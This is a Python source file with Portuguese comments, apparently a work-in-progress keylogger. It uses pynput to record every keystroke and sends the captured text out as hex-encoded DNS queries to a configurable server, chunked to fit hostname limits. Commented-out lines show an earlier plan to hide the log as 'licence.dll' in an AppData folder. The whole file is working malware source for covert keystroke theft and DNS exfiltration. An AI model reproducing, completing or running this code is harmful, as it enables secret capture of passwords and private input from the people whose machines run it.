###############################################################
# Imports
###############################################################
import os
import time
import socket
import threading
from pynput import keyboard
from dnslib import DNSRecord, RR, A

###############################################################
# Vars. Global
###############################################################
# Ofuscação no Windows (Antigamente era salvo em arquivo... mudei os planos) 
# _PATH = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\Windows NA'
# _NAME = 'licence.dll'
_DNS_ADDR = ('127.0.0.1', 9953)
_FAKE_DOMAIN = '.example.com'
_KEYS = []

###############################################################
# Classes e Funções
###############################################################
def send_data(data):
    '''
    Recebe os dados e os envia usando requisições DNS
    de 63 em 63 bytes.

    Parameters:
        data (str): Data que iremos enviar
    
    Returns:
        None    
    '''
    global _DNS_ADDR, _FAKE_DOMAIN

    print('vou enviar algo')

    # Convertendo para bytes usando somente 8 bits para economizar
    # espaço, data seria enviado pela rede
    #data = [entry.to_bytes(1, 'big') for entry in data]
    #print(data)

    # Divide os dados em partes menores para serem válidos
    # como nomes de domínio máximo de 63bytes por hostname.
    # Decidi apenas previnir caso a função seja chamada com mais chars do que deveria
    parts = [data[chunk:chunk+63] for chunk in range(0, len(data), 63)] 

    while len(parts) > 0:
        # Cria o payload com o nome de domínio fictício
        payload = parts.pop(0)
        print(f'enviando isso: {payload}')
        payload = ''.join([hex(ord(c)) for c in payload])
        payload = payload.replace('0x', '')
        request = str(payload) + str(_FAKE_DOMAIN)
        
        # Cria a requisição DNS
        domain = DNSRecord.question(request)

        # Envia a requisição DNS para o servidor
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5.0)

        try:
            sock.sendto(domain.pack(), _DNS_ADDR)
        except:
            print('Erro ao enviar!')

        try:
            # Recebendo resposta falsa do DNS
            _ = sock.recvfrom(512)
        except socket.timeout:
            print('Tempo de espera expirado. Não foi recebida uma resposta do servidor DNS.')
            pass
            
        # Não sei se precisa disso...
        sock.close()

def on_release(key):
    global _KEYS

    # Só envio quando bater o tamanho máximo de envio por DNS
    if len(_KEYS) >= 30:
        send_data(_KEYS)
        _KEYS = []

    # ESC para sair, tirar depois
    if key == keyboard.Key.esc:
        return False

    try:
        # Teclas normais são adicionadas normalmente
        _KEYS.append(key.char)

    except AttributeError:
        # Teclas especiais (shift, enter, ctrl, alt, ...)
        # Possíveis valores em
        # https://pynput.readthedocs.io/en/latest/_modules/pynput/keyboard/_base.html#Key
        
        if key == key.space or key == key.enter:
            try:
                if _KEYS[-1] == ' ':
                    pass
                else:
                    _KEYS.append(' ')
            except:
                pass

        elif key == key.backspace:
            _KEYS = _KEYS[:-1]

        if key == key.caps_lock:
            _KEYS.append('¥')

        if key == key.num_lock:
            _KEYS.append('ß')

        if key == key.cmd:
            _KEYS.append('┤')                                                                       

        if key == key.tab:
            _KEYS.append('¤')

        if key == key.ctrl_l or key.ctrl_r:
            _KEYS.append('©')

        if key == key.shift or key.shift_l:
            _KEYS.append('Þ')
    
    # O TECLADO NUMERO ESTÁ RETORNANDO NONE, TENHO QUE CONFERIR OQUE ESTÁ ACONTECENDO
        if key == None:
            _KEYS.append('¿')
            
        else:
            print(key)

###############################################################
# Main
###############################################################
if __name__ == "__main__":
    lst = keyboard.Listener(on_release=on_release)
    lst.start()
    lst.join()
